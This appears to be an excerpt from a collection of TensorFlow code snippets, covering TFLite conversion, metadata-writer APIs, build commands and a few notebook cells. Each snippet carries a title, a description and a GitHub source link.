DESCRIPTION: Uses the `tf.lite.TFLiteConverter.from_keras_model` class method to create a converter instance from the trained Keras model. The `convert` method is then called on the converter instance to generate the TensorFlow Lite model in byte format.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/examples/experimental_new_converter/keras_lstm.ipynb#_snippet_4

LANGUAGE: python
CODE:
```
converter = tf.lite.TFLiteConverter.from_keras_model(model)
tflite_model = converter.convert()
```

----------------------------------------

TITLE: Listing Generated Packages Bash
DESCRIPTION: Lists the contents of the directory where the built wheel packages are stored, typically to inspect the newly created files. File ownership might be root due to Docker volume permissions.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/tools/tf_sig_build_dockerfiles/README.md#_snippet_7

LANGUAGE: Bash
CODE:
```
ls -al /tmp/packages
```

----------------------------------------

TITLE: Initializing StatsT Python
DESCRIPTION: Provides the standard constructor for the `StatsT` class. This method is used to create a new, potentially empty, instance of the StatsT object before populating its statistical fields.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/StatsT.md#_snippet_0

LANGUAGE: Python
CODE:
```
tflite_support.metadata_schema_py_generated.StatsT()
```

----------------------------------------

TITLE: Populating Metadata into Model (Python)
DESCRIPTION: Embeds the generated metadata and any associated label files into the provided TFLite model buffer. This operation modifies the model buffer to include the metadata necessary for TFLite Support tools.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_writers/nl_classifier/MetadataWriter.md#_snippet_6

LANGUAGE: Python
CODE:
```
populate() -> bytearray
```

----------------------------------------

TITLE: Creating TensorMetadataT for Input Audio in Python
DESCRIPTION: Generates a Flatbuffers Python object of type `TensorMetadataT` based on the information stored in the `InputAudioTensorMd` object. This method validates the `sample_rate` and `channels` values.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_writers/metadata_info/InputAudioTensorMd.md#_snippet_1

LANGUAGE: python
CODE:
```
create_metadata() -> tflite_support.metadata_schema_py_generated.TensorMetadataT
```

----------------------------------------

TITLE: Initializing TensorGroupT from Packed Buffer Python
DESCRIPTION: A class method to initialize a `TensorGroupT` object from a packed data buffer, optionally specifying the starting position. This is typically used for FlatBuffers deserialization.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/TensorGroupT.md#_snippet_3

LANGUAGE: python
CODE:
```
@classmethod
InitFromPackedBuf(
    buf, pos=0
)
```

----------------------------------------

TITLE: Creating Bert Tokenizer Metadata (Python)
DESCRIPTION: Generates the Flatbuffers Python object representation of the Bert tokenizer metadata based on the information provided during the class initialization. This object can then be used to embed the metadata into a TFLite model file.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_writers/metadata_info/BertTokenizerMd.md#_snippet_1

LANGUAGE: python
CODE:
```
create_metadata() -> tflite_support.metadata_schema_py_generated.ProcessUnitT
```

----------------------------------------

TITLE: Implementing C++ Task API Pre/Postprocessing
DESCRIPTION: This snippet shows the implementation structure for the `Preprocess` and `Postprocess` methods required when extending `BaseTaskApi` in C++. `Preprocess` is responsible for converting the API's input arguments into the model's input tensors, potentially involving tokenization or data manipulation. `Postprocess` takes the model's output tensors and transforms them into the API's specified output type, which typically involves interpreting the model's raw output.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/inference_with_metadata/task_library/customized_task_api.md#_snippet_2

LANGUAGE: C++
CODE:
```
class BertQuestionAnswerer : public BaseTaskApi<
                                  std::vector<QaAnswer>, // OutputType
                                  const std::string&, const std::string& // InputTypes
                                  > {
      // Convert API input into tensors
      absl::Status BertQuestionAnswerer::Preprocess(
        const std::vector<TfLiteTensor*>& input_tensors, // input tensors of the model
        const std::string& context, const std::string& query // InputType of the API
      ) {
        // Perform tokenization on input strings
        ...
        // Populate IDs, Masks and SegmentIDs to corresponding input tensors
        PopulateTensor(input_ids, input_tensors[0]);
        PopulateTensor(input_mask, input_tensors[1]);
        PopulateTensor(segment_ids, input_tensors[2]);
        return absl::OkStatus();
      }

      // Convert output tensors into API output
      StatusOr<std::vector<QaAnswer>> // OutputType
      BertQuestionAnswerer::Postprocess(
        const std::vector<const TfLiteTensor*>& output_tensors, // output tensors of the model
      ) {
        // Get start/end logits of prediction result from output tensors
        std::vector<float> end_logits;
        std::vector<float> start_logits;
        // output_tensors[0]: end_logits FLOAT[1, 384]
        PopulateVector(output_tensors[0], &end_logits);
        // output_tensors[1]: start_logits FLOAT[1, 384]
        PopulateVector(output_tensors[1], &start_logits);
        ...
        std::vector<QaAnswer::Pos> orig_results;
        // Look up the indices from vocabulary file and build results
        ...
        return orig_results;
      }
    }
```

----------------------------------------

TITLE: Generating feature Protobuf Code CMake
DESCRIPTION: Adds a custom command using `add_custom_command` to invoke the `protoc` compiler. It specifies the output files (`.pb.h`, `.pb.cc`), the command (`${Protobuf_PROTOC_EXECUTABLE}`), arguments (`--cpp_out`, `--proto_path`), and dependencies (`protoc` executable, `.proto` file).
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/core/example/CMakeLists.txt#_snippet_2

LANGUAGE: CMake
CODE:
```
add_custom_command(
  OUTPUT ${feature_generated_files}
  COMMAND ${Protobuf_PROTOC_EXECUTABLE}
  ARGS --cpp_out=${CMAKE_CURRENT_BINARY_DIR} --proto_path=${TENSORFLOW_SOURCE_DIR} ${CMAKE_CURRENT_SOURCE_DIR}/feature.proto
  DEPENDS ${Protobuf_PROTOC_EXECUTABLE} ${CMAKE_CURRENT_SOURCE_DIR}/feature.proto
)
```

----------------------------------------

TITLE: Initializing MetadataWriter - TFLite Image Segmenter - Python
DESCRIPTION: Initializes a MetadataWriter object for an image segmenter model. This constructor takes the model buffer, an optional metadata buffer, and an optional list of associated file paths to prepare the writer for populating metadata into the model.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_writers/image_segmenter/MetadataWriter.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_support.metadata_writers.image_segmenter.MetadataWriter(
    model_buffer: bytearray,
    metadata_buffer: Optional[bytearray] = None,
    associated_files: Optional[List[str]] = None
)
```

----------------------------------------

TITLE: Explicit tf.function Steps with AutoGraph Python
DESCRIPTION: Illustrates the process behind `tf.function(f)` by explicitly showing the AutoGraph conversion step using `tf.autograph.to_graph` followed by creating a graph function from the *already converted* function with `autograph=False`.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/autograph/g3doc/reference/intro.md#_snippet_2

LANGUAGE: Python
CODE:
```
converted_f = tf.autograph.to_graph(f)
graph_f = tf.function(autograph=False)(converted_f)
```

----------------------------------------

TITLE: Adding label_image Executable Target (CMake)
DESCRIPTION: Defines the `label_image` executable target using the complete list of source files accumulated in the `TFLITE_LABEL_IMAGE_SRCS` variable.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/examples/label_image/CMakeLists.txt#_snippet_6

LANGUAGE: cmake
CODE:
```
add_executable(label_image
  ${TFLITE_LABEL_IMAGE_SRCS}
)
```

----------------------------------------

TITLE: Creating BertCluAnnotator from Options (Python)
DESCRIPTION: Describes the `create_from_options` class method. This factory method allows creating the `BertCluAnnotator` by providing a configuration object (`BertCluAnnotatorOptions`), offering more control over the setup.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/task/text/BertCluAnnotator.md#_snippet_3

LANGUAGE: python
CODE:
```
@classmethod\ncreate_from_options(\n    options: tflite_support.task.text.BertCluAnnotatorOptions\n) -> 'BertCluAnnotator'
```

----------------------------------------

TITLE: Creating Metadata from Flatbuffers Objects (Python)
DESCRIPTION: Creates a MetadataWriter object using raw metadata Flatbuffers Python Objects for detailed control over metadata fields. Allows specifying model, input, output, associated files, and process unit metadata.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_writers/nl_classifier/MetadataWriter.md#_snippet_2

LANGUAGE: Python
CODE:
```
@classmethod
create_from_metadata(
    model_buffer: bytearray,
    model_metadata: Optional[<a href="../../../tflite_support/metadata_schema_py_generated/ModelMetadataT"><code>tflite_support.metadata_schema_py_generated.ModelMetadataT</code></a>] = None,
    input_metadata: Optional[List[_metadata_fb.TensorMetadataT]] = None,
    output_metadata: Optional[List[_metadata_fb.TensorMetadataT]] = None,
    associated_files: Optional[List[str]] = None,
    input_process_units: Optional[List[_metadata_fb.ProcessUnitT]] = None,
    output_process_units: Optional[List[_metadata_fb.ProcessUnitT]] = None
)
```

----------------------------------------

TITLE: Checking Stats Buffer Identifier in Python
DESCRIPTION: This class method checks if the given FlatBuffers buffer contains the correct file identifier for a `Stats` object. It verifies the buffer's type, optionally considering size-prefixing.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/Stats.md#_snippet_11

LANGUAGE: Python
CODE:
```
@classmethod
StatsBufferHasIdentifier(
    buf, offset, size_prefixed=False
)
```

----------------------------------------

TITLE: Initializing TfLite with GPU Support (Kotlin)
DESCRIPTION: Initialize the core TFLite runtime via Play services, enabling support for the GPU delegate during the asynchronous initialization process.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/android/java.md#_snippet_25

LANGUAGE: Kotlin
CODE:
```
TfLite.initialize(context,
          TfLiteInitializationOptions.builder()
           .setEnableGpuDelegateSupport(true)
           .build())
```

----------------------------------------

TITLE: Initializing TFLite ImageSearcher Python
DESCRIPTION: Constructs a new ImageSearcher object. This constructor is typically used internally and requires configuration options (`options`) and an internal C++ searcher instance (`cpp_searcher`).
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/task/vision/ImageSearcher.md#_snippet_0

LANGUAGE: Python
CODE:
```
tflite_support.task.vision.ImageSearcher(
    options: tflite_support.task.vision.ImageSearcherOptions,
    cpp_searcher: _CppImageSearcher
) -> None
```

----------------------------------------

TITLE: Adding Upstream XLA Remote (Shell)
DESCRIPTION: Configures the main `openxla/xla` repository as the 'upstream' remote in the local Git setup. This allows developers to fetch updates and changes from the main project easily.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/developer_guide.md#_snippet_1

LANGUAGE: sh
CODE:
```
git remote add upstream https://github.com/openxla/xla.git
```

----------------------------------------

TITLE: Create TensorMetadata From Buffer - Class Method (Python)
DESCRIPTION: A class method that initializes and returns a TensorMetadata object from a FlatBuffers buffer. It takes the buffer byte string and an optional offset. This is the standard way to deserialize the object.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/TensorMetadata.md#_snippet_8

LANGUAGE: python
CODE:
```
@classmethod
GetRootAs(
    buf, offset=0
)
```

----------------------------------------

TITLE: Generating CHLO Legalization Rewriters (CMake)
DESCRIPTION: Uses the MLIR tablegen tool to generate rewriters from the chlo_legalize_to_hlo_patterns.td file. The output is written to generated_chlo_legalize_to_hlo.inc.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/xla/mlir_hlo/mhlo/transforms/CMakeLists.txt#_snippet_5

LANGUAGE: CMake
CODE:
```
mlir_tablegen(chlo_legalize_to_hlo/generated_chlo_legalize_to_hlo.inc -gen-rewriters)
```

----------------------------------------

TITLE: Comparing tflite_support.task.processor.QaAnswer Instances in Python
DESCRIPTION: This snippet shows the signature for the `__eq__` method. It is used to check if the current `QaAnswer` object is equal to another object provided as the `other` argument, returning a boolean value.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/task/processor/QaAnswer.md#_snippet_1

LANGUAGE: python
CODE:
```
__eq__(
 other: Any
) -> bool
```

----------------------------------------

TITLE: Build OVIC Benchmarker APK - Bazel Shell
DESCRIPTION: Builds the release-optimized Android APK (`.apk`) for the OVIC benchmarker application using Bazel. The `--cxxopt=-Wno-all` flag suppresses C++ compiler warnings.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/java/ovic/README.md#_snippet_11

LANGUAGE: sh
CODE:
```
bazel build -c opt --cxxopt=-Wno-all //tensorflow/lite/java/ovic/demo/app:ovic_benchmarker_binary
```

----------------------------------------

TITLE: Include TFLite C API Header
DESCRIPTION: Includes the necessary header file (`tensorflow/lite/c/c_api.h`) in your native C/C++ code to access the standard TensorFlow Lite C API functions when using the TFLite in Google Play services runtime.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/android/native.md#_snippet_7

LANGUAGE: C++
CODE:
```
#include "tensorflow/lite/c/c_api.h"
```

----------------------------------------

TITLE: Configuring TensorFlow Lite Build with CMake
DESCRIPTION: Creates a build directory (`minimal_build`), changes into it, and then runs CMake to configure the build files for the minimal TensorFlow Lite example located in the source tree.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/examples/minimal/README.md#_snippet_3

LANGUAGE: sh
CODE:
```
mkdir minimal_build
cd minimal_build
cmake ../tensorflow_src/tensorflow/lite/examples/minimal
```

----------------------------------------

TITLE: Getting Tensor Name by Index | TensorFlow Lite Support Python
DESCRIPTION: Retrieves the name of a tensor within the group at a specific index `j`. This method allows accessing individual tensor names within the list associated with the group.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/TensorGroup.md#_snippet_5

LANGUAGE: python
CODE:
```
TensorNames(
 j
)
```

----------------------------------------

TITLE: Creating Task API BaseOptions for GPU (Java)
DESCRIPTION: Construct `BaseOptions` for use with TFLite Task API models, specifying the use of the GPU delegate by calling the `useGpu()` method on the builder.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/android/java.md#_snippet_22

LANGUAGE: Java
CODE:
```
BaseOptions baseOptions = BaseOptions.builder().useGpu().build();
```

----------------------------------------

TITLE: Creating Score Calibration File Metadata Python
DESCRIPTION: This snippet shows the signature for the `create_score_calibration_file_md` method of the `ScoreCalibrationMd` class. This method creates metadata specifically for the associated score calibration file. It returns an `AssociatedFileMd` object.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_writers/metadata_info/ScoreCalibrationMd.md#_snippet_2

LANGUAGE: python
CODE:
```
create_score_calibration_file_md() -> tflite_support.metadata_writers.metadata_info.AssociatedFileMd
```

----------------------------------------

TITLE: Initializing CMake Project CMake
DESCRIPTION: Initializes the CMake project, setting the project name to 'fft2d' and specifying that the primary language used is C. This command is typically the first non-comment command in a CMakeLists.txt file.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/tools/cmake/modules/fft2d/CMakeLists.txt#_snippet_0

LANGUAGE: CMake
CODE:
```
project(fft2d C)
```

----------------------------------------

TITLE: Add TFLite C++ API Dependency with Bazel (Python)
DESCRIPTION: Defines an Objective-C library target in a Bazel BUILD file, adding the TensorFlow Lite C++ framework library as a dependency for direct use.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/guide/ios.md#_snippet_8

LANGUAGE: Python
CODE:
```
# Using C++ API directly
objc_library(
  deps = [
      "//tensorflow/lite:framework",
  ],
)
```

----------------------------------------

TITLE: Allocating Tensors in TensorFlow Lite Python
DESCRIPTION: This method must be called on a TensorFlow Lite interpreter instance to allocate the necessary memory for the model's tensors before inference can be performed. It does not take any parameters.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tf/lite/Interpreter.md#_snippet_4

LANGUAGE: python
CODE:
```
allocate_tensors()
```

----------------------------------------

TITLE: Building TensorFlowLite Swift Library (Shell)
DESCRIPTION: Builds the specific Bazel target ':TensorFlowLite' located in the 'tensorflow/lite/swift' directory. This command compiles the TensorFlow Lite Swift library and its dependencies using Bazel.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/swift/README.md#_snippet_4

LANGUAGE: shell
CODE:
```
bazel build tensorflow/lite/swift:TensorFlowLite
```

----------------------------------------

TITLE: Installing Clang for Native CPU Build (Linux)
DESCRIPTION: Installs the Clang C/C++/Objective-C compiler using the `apt` package manager. Clang is a recommended prerequisite for building XLA natively on Linux without using Docker, particularly for CPU support.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/build_from_source.md#_snippet_3

LANGUAGE: shell
CODE:
```
apt install clang
```

----------------------------------------

TITLE: Initializing TensorMetadataT from Packed Buffer Python
DESCRIPTION: This class method initializes a `TensorMetadataT` object from a packed FlatBuffers buffer. It takes the buffer (`buf`) and an optional starting position (`pos`, defaulting to 0).
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/TensorMetadataT.md#_snippet_3

LANGUAGE: Python
CODE:
```
@classmethod
InitFromPackedBuf(
    buf, pos=0
)
```

----------------------------------------

TITLE: Convert HLO Proto/Binary to HLO Text
DESCRIPTION: This command uses `hlo-opt` to convert an input HLO module provided in protobuf text format (`.pbtxt`) or binary format (`.pb`) back into the human-readable HLO text format.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/tools.md#_snippet_22

LANGUAGE: Command Line
CODE:
```
hlo-opt input.pbtxt or input.pb
```

----------------------------------------

TITLE: Initialize TensorMetadata Object - Instance Method (Python)
DESCRIPTION: Initializes an existing TensorMetadata object instance using a FlatBuffers buffer and a starting position within the buffer. This is typically used internally after creating an object instance.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/TensorMetadata.md#_snippet_10

LANGUAGE: python
CODE:
```
Init(
    buf, pos
)
```

----------------------------------------

TITLE: Declaring Bazel Compatibility Dependency
DESCRIPTION: Specifies a specific dependency required for ensuring compatibility between Python 3.11 and Bazel 6 within the TensorFlow build environment as a workaround for a known issue.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/tools/tf_sig_build_dockerfiles/devel.requirements.txt#_snippet_5

LANGUAGE: pip requirements
CODE:
```
# For using Python 3.11 with Bazel 6 (b/286090018)
lit ~= 17.0.2
```

----------------------------------------

TITLE: Install Standard TFLite Model Maker Python Package Shell
DESCRIPTION: This shell command uses pip to install the standard, stable release of the TensorFlow Lite Model Maker library. This is the recommended installation method for most users.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/modify/model_maker/index.md#_snippet_1

LANGUAGE: shell
CODE:
```
pip install tflite-model-maker
```

----------------------------------------

TITLE: Checking if Max Values are None in Python
DESCRIPTION: This instance method checks if the maximum values field in the FlatBuffers buffer is set to None. It returns a boolean indicating the presence or absence of max values.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/Stats.md#_snippet_5

LANGUAGE: Python
CODE:
```
MaxIsNone()
```

----------------------------------------

TITLE: Installing TensorFlow Nightly Python Package
DESCRIPTION: Installs or upgrades the TensorFlow nightly Python package using pip, which is recommended for trying the JAX to TFLite conversion feature. Requires pip to be installed.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/examples/jax_conversion/overview.md#_snippet_0

LANGUAGE: Shell
CODE:
```
pip install tf-nightly --upgrade
```

----------------------------------------

TITLE: Getting Embedding Dimension - Python
DESCRIPTION: Retrieves the dimensionality of the embedding output for a specific output layer index. Useful for understanding the size of the feature vectors produced by the model's outputs.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/task/text/TextEmbedder.md#_snippet_4

LANGUAGE: python
CODE:
```
get_embedding_dimension(
    output_index: int
) -> int
```

----------------------------------------

TITLE: Configuring TensorFlow for iOS Build Shell
DESCRIPTION: Executes the TensorFlow configure script from the root directory. Users must answer 'y' when prompted to build with iOS support to enable Objective-C library compilation.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/objc/README.md#_snippet_0

LANGUAGE: shell
CODE:
```
python configure.py
```

----------------------------------------

TITLE: Configure TFLite Cross-compilation (Generic CMake)
DESCRIPTION: Initiates a generic CMake configuration process for cross-compiling TensorFlow Lite to a different target architecture. The `-DCMAKE_TOOLCHAIN_FILE` option is crucial for specifying the path to the CMake toolchain file tailored for the target.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/guide/build_cmake.md#_snippet_7

LANGUAGE: sh
CODE:
```
cmake -DCMAKE_TOOLCHAIN_FILE=<CMakeToolchainFileLoc> ../tensorflow/lite/
```

----------------------------------------

TITLE: Getting Populated Metadata JSON - TFLite - Python
DESCRIPTION: Retrieves the JSON metadata string that has been populated and embedded into the model. This differs from `get_metadata_json()` which returns the original, unpopulated metadata string. It returns the generated JSON metadata string as a Python `str`.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_writers/object_detector/MetadataWriter.md#_snippet_5

LANGUAGE: Python
CODE:
```
get_populated_metadata_json() -> str
```

----------------------------------------

TITLE: Applying TFLite Weight Quantization using C++ API (C++)
DESCRIPTION: This C++ snippet shows how to programmatically apply post-training weight quantization to a TFLite model represented by a `::tflite::Model` object. It requires a `flatbuffers::FlatBufferBuilder` to construct the new model buffer, calls the `QuantizeWeights` optimization function, checks the status, and obtains a pointer to the newly created model buffer.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/tools/optimize/g3doc/quantize_weights.md#_snippet_1

LANGUAGE: C++
CODE:
```
::tflite::Model* input_model = ...;
flatbuffers::FlatBufferBuilder builder;
TfLiteStatus status = ::tflite::optimize::QuantizeWeights(&builder, input_model);
CHECK(status, kTfLiteStatusOk);
const uint8_t* buffer = builder.GetBufferPointer();
tflite::Model* output_model = ::tflite::GetModel(buffer);
```

----------------------------------------

TITLE: Modifying Static Python List Element in Control Flow Python
DESCRIPTION: Shows that modifying an element of a Python list is allowed inside control flow if the list's structure (length) is static and doesn't change. The code implicitly uses functional style by reassigning the list variable if it were a different operation like filtering, but direct element modification is also supported for static structures. Requires TensorFlow.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/autograph/g3doc/reference/limitations.md#_snippet_28

LANGUAGE: Python
CODE:
```
static_list = [tf.constant(3)]
while d.prop > 0:
  static_list[0] -= 1  # Okay -- static_list does not change structure
```

----------------------------------------

TITLE: Importing TensorFlow and Model Maker Libraries Python
DESCRIPTION: Imports all necessary Python libraries, including os, numpy, tensorflow, tflite_model_maker modules (model_spec, image_classifier, ExportFormat, QuantizationConfig, DataLoader), and matplotlib for plotting. It also asserts that the TensorFlow version is 2.x.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/modify/model_maker/image_classification.ipynb#_snippet_1

LANGUAGE: python
CODE:
```
import os

import numpy as np

import tensorflow as tf
assert tf.__version__.startswith('2')

from tflite_model_maker import model_spec
from tflite_model_maker import image_classifier
from tflite_model_maker.config import ExportFormat
from tflite_model_maker.config import QuantizationConfig
from tflite_model_maker.image_classifier import DataLoader

import matplotlib.pyplot as plt
```

----------------------------------------

TITLE: Initialize TFLite Support FeatureVector Python
DESCRIPTION: Initializes a dense feature vector instance for TFLite Support tasks. The `value` parameter is a NumPy array (`np.ndarray`) holding the vector data, expected to be one-dimensional and L2-normalized. The datatype can be float or uint8 depending on quantization options.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/task/processor/FeatureVector.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_support.task.processor.FeatureVector(
    value: np.ndarray
)
```

----------------------------------------

TITLE: Saving Vocabulary File in TensorFlow
DESCRIPTION: Saves the model's vocabulary to a specified filename. The vocabulary is crucial for tokenizing text data consistently during both training and inference.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/question_answer/BertQaSpec.md#_snippet_12

LANGUAGE: python
CODE:
```
save_vocab(
    vocab_filename
)

```

----------------------------------------

TITLE: Define Data Exploration Utilities Python
DESCRIPTION: Defines dictionaries mapping bird codes to full names and image URLs. It also includes utility functions (`get_random_audio_file`, `show_bird_data`) to select a random audio file from the test set and display relevant information (bird name, code, image, waveform plot, and play audio) for data exploration.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/modify/model_maker/audio_classification.ipynb#_snippet_4

LANGUAGE: python
CODE:
```
data_dir = './dataset/small_birds_dataset'

bird_code_to_name = {
  'wbwwre1': 'White-breasted Wood-Wren',
  'houspa': 'House Sparrow',
  'redcro': 'Red Crossbill',  
  'chcant2': 'Chestnut-crowned Antpitta',
  'azaspi1': "Azara's Spinetail",   
}

birds_images = {
  'wbwwre1': 'https://upload.wikimedia.org/wikipedia/commons/thumb/2/22/Henicorhina_leucosticta_%28Cucarachero_pechiblanco%29_-_Juvenil_%2814037225664%29.jpg/640px-Henicorhina_leucosticta_%28Cucarachero_pechiblanco%29_-_Juvenil_%2814037225664%29.jpg', # 	Alejandro Bayer Tamayo from Armenia, Colombia 
  'houspa': 'https://upload.wikimedia.org/wikipedia/commons/thumb/5/52/House_Sparrow%2C_England_-_May_09.jpg/571px-House_Sparrow%2C_England_-_May_09.jpg', # 	Diliff
  'redcro': 'https://upload.wikimedia.org/wikipedia/commons/thumb/4/49/Red_Crossbills_%28Male%29.jpg/640px-Red_Crossbills_%28Male%29.jpg', #  Elaine R. Wilson, www.naturespicsonline.com
  'chcant2': 'https://upload.wikimedia.org/wikipedia/commons/thumb/6/67/Chestnut-crowned_antpitta_%2846933264335%29.jpg/640px-Chestnut-crowned_antpitta_%2846933264335%29.jpg', # 	Mike's Birds from Riverside, CA, US
  'azaspi1': 'https://upload.wikimedia.org/wikipedia/commons/thumb/b/b2/Synallaxis_azarae_76608368.jpg/640px-Synallaxis_azarae_76608368.jpg', # https://www.inaturalist.org/photos/76608368
}

test_files = os.path.abspath(os.path.join(data_dir, 'test/*/*.wav'))

def get_random_audio_file():
  test_list = glob.glob(test_files)
  random_audio_path = random.choice(test_list)
  return random_audio_path


def show_bird_data(audio_path):
  sample_rate, audio_data = wavfile.read(audio_path, 'rb')

  bird_code = audio_path.split('/')[-2]
  print(f'Bird name: {bird_code_to_name[bird_code]}')
  print(f'Bird code: {bird_code}')
  display(Image(birds_images[bird_code]))

  plttitle = f'{bird_code_to_name[bird_code]} ({bird_code})'
  plt.title(plttitle)
  plt.plot(audio_data)
  display(Audio(audio_data, rate=sample_rate))

print('functions and data structures created')
```

----------------------------------------

TITLE: Getting TFLite Model Buffer with Metadata - Python
DESCRIPTION: This method retrieves the byte buffer of the TensorFlow Lite model, including any packed metadata and associated files. It provides the complete model data as a bytearray for further processing or saving.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata/MetadataPopulator.md#_snippet_3

LANGUAGE: Python
CODE:
```
get_model_buffer()
```

----------------------------------------

TITLE: Applying Reshape to Convert Scalar/Array (Conceptual)
DESCRIPTION: Illustrates a special case of the Reshape operation: converting between a scalar and a single-element array. It shows how a f32[1x1] array can be reshaped into a scalar f32, and conversely, how a scalar f32 can be reshaped into a f32[1x1] array.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/operation_semantics.md#_snippet_30

LANGUAGE: conceptual
CODE:
```
Reshape(f32[1x1] {{5}}, {}) == 5;
Reshape(5, {1,1}) == f32[1x1] {{5}};
```

----------------------------------------

TITLE: Saving TensorFlow Model with Custom Op (Python)
DESCRIPTION: Saves a TensorFlow model containing a custom multiplex op (`multiplex_op`) to a specified `path` as a `SavedModel`. It defines a simple `tf.Module` that uses the op and saves it with input signatures based on example tensors, intended for creating models to test backward compatibility.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/examples/custom_ops_doc/multiplex_4/README.md#_snippet_0

LANGUAGE: Python
CODE:
```
def save(multiplex_op, path):
  """Save a model that contains the given `multiplex_op`.

  Args:
    multiplex_op: A multiplex Custom Op, e.g. multiplex_4_op.multiplex. This is
      parameterized so it can also be used to create an "old" model with an
      older version of the op, e.g. multiplex_2_op.multiplex.
    path: Directory to save model to.
  """
  example_cond, example_a, example_b = _get_example_tensors()

  class UseMultiplex(tf.Module):

    @tf.function(input_signature=[
        tf.TensorSpec.from_tensor(example_cond),
        tf.TensorSpec.from_tensor(example_a),
        tf.TensorSpec.from_tensor(example_b)
    ])
    def use_multiplex(self, cond, a, b):
      return multiplex_op(cond, a, b)

  model = UseMultiplex()
  tf.saved_model.save(
      model,
      path,
      signatures=model.use_multiplex.get_concrete_function(
          tf.TensorSpec.from_tensor(example_cond),
          tf.TensorSpec.from_tensor(example_a),
          tf.TensorSpec.from_tensor(example_b)))

```

----------------------------------------

TITLE: Initialize TensorFlow Lite ImageSegmenter - Python
DESCRIPTION: Initializes the `ImageSegmenter` object. This constructor is typically used internally after the object is created via a factory method like `create_from_file` or `create_from_options`. It requires specific options and an underlying C++ segmenter instance.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/task/vision/ImageSegmenter.md#_snippet_0

LANGUAGE: python
CODE:
```
